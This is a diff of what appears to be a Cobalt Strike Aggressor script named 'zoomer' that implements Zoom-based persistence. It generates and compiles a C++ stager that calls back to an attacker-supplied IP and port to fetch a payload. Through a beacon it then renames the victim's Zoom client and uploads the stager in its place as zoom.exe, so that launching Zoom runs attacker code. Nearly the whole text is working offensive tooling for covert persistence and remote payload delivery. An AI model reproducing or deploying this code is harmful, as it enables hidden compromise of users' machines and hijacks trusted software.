@@ -22,42 +22,139 @@
 # 
 ####################################
 
-# Modify this as needed
-$builder = "Builder.exe";
-$x86compiler = "cl.exe";
-$x64compiler = "cl.exe";
 
-command zoomer {
+# Config: 
+# Modify this as needed
+
+$sourceDir = "C:\\Users\\S4R1N\\source\\repos\\ZoomPersistence\\Source\\";
+$outputDir = "C:\\Users\\S4R1N\\source\\repos\\ZoomPersistence\\Output\\";
+$template_file = "template.txt";
+$compiler = "mingw32-c++.exe";
+
+# DO NOT change this. This whole technique relies on this.
+$output_file = "zoom.exe";
+
+alias zoomer {
 
     # Get Number of Args 
     $size = size(@_);
 
     # check size 
-    if ($size < 3 ) {
+    if ($size != 5 ) {
     
-        println("\c8[+]\cF Usage: zoomer <IP> <PORT> <FILE>");
+        berror($1, "Usage: zoomer <IP> <PORT> <FILE> <NEW_ZOOM_NAME>");
     
     } else {
 
         # Splitting Arg Array to Respective Variables
-        $IP = @_[0];
-        $PORT = @_[1];
-        $FILE = @_[2];
+        $IP = @_[1];
+        $PORT = @_[2];
+        $FILE = @_[3];
+        $ZOOMEXE = @_[4];
 
         # String Concatination via . Operator
         $URL =  "http://" . "$IP" . ":" . "$PORT" . "/" . "$FILE";
+        $STAGER = "$sourceDir" . "$IP" . "_" . "$PORT" . "_" . "$FILE" . ".cpp";
+
+        # Creating Some Vars for Later User
+        $user = beacon_info($1, "user");
+        $zd = "c:\\\\users\\\\" . "$user" . "\\\\AppData\\\\Roaming\\\\Zoom\\\\bin\\\\";
+        $zn = "$zd" . "$ZOOMEXE";
         
-        println("\c9[+]\cF Building Stager to fetch from $URL");
+        # DEBUG
+        blog($1,"Building Stager to fetch from $URL");
 
-        # Create process and waits forever until it ends :) 
-        $hProcess = exec("Builder.exe");
-        printAll(readAll($hProcess));
-        $retcode = wait($hProcess, 0); 
+        createNewFile("$STAGER");
+        $sourcetext = genSource($IP, $PORT, $FILE, $zn);
+        fileWriter($STAGER, $sourcetext);
 
-        println("\c9[+]\cF Executed Command $retcode")
+        blog($1,"Created New Stager Source $STAGER");
 
+        # Preparing Compilation 
+        $exe = "$outputDir" . "$output_file";
+        blog($1,"Attempting to Compile Stager");
+        @command = @("$compiler", "-w", "-o", "$exe", "$STAGER", "-l", "wininet");
+        $hProcess = exec(@command, $null, $compilerDirectory);
+        
+        #Wait for command to finish
+        $retcode = wait($hProcess, 0);
+        if ($retcode == 0){ 
 
+            #info for payload delivery
+            $zoomdir = "c:\\users\\" . "$user" . "\\AppData\\Roaming\\Zoom\\bin\\";
+            $zoom = "$zoomdir" . "zoom.exe";
+            $zoomnew = "$zoomdir" . "$ZOOMEXE";
+            
+            blog($1,"Return Code From Compiler: $retcode");
+
+            blog($1, "Renaming Zoom Client For $user \($zoom\) to $ZOOMEXE \($zoomnew\)");
+            
+            bshell($1,"rename $zoom $ZOOMEXE");
+
+            # Reading Bytes to Upload
+             
+            $file = openf("$exe");
+            $data = readb($file, -1);
+
+            # upload binary 
+            bupload_raw($1, "$zoom", "$data"); 
+
+            # Close handle to file
+            closef($exe);
+
+            $out = openf(">test.exe");
+            writeb($out, $data);
+            closef($out);
+        
+        } else {
+
+            berror($1, "ERROR Compiling Payload\cF")
+
+        }
+    
     }
 
+
+}
+
+sub genSource
+{
+    # Usage genSource($ip, $port, $file, $zoomexe);
+    $IP = $1;
+    $PORT = $2;
+    $FILE = $3;
+    $ZOOMDEF = $4; 
+
+    # adding global vars
+    $src = "#define CALLBACK_SERVER \"$IP\"\n" . "#define CALLBACK_PORT $PORT\n" . "#define CALLBACK_ENDPOINT \"$FILE\"\n" . "#define ZOOMNAME \"$ZOOMDEF\"\n";
+    #open file as read-only 
+    $tempf = "$sourceDir" . "$template_file";
+    blog($1,"Attempting to read template file \($tempf\)");
+    $file = openf("$tempf");
+
+    # read data and append to prexisting source
+    while $read(readln($file)) {
+
+        $src = "$src" . "$read" . "\n";
+
+    }
+    
+    closef("tempf");
+    return $src;
+
+}
+
+sub fileWriter
+{
+
+    $file = $1;
+    $source = $2;
+
+    # Open file Overwriting Content 
+    $hFile = openf(">$1");
+
+    println($hFile, "$source");
+
+    closef("hFile");
 
 }
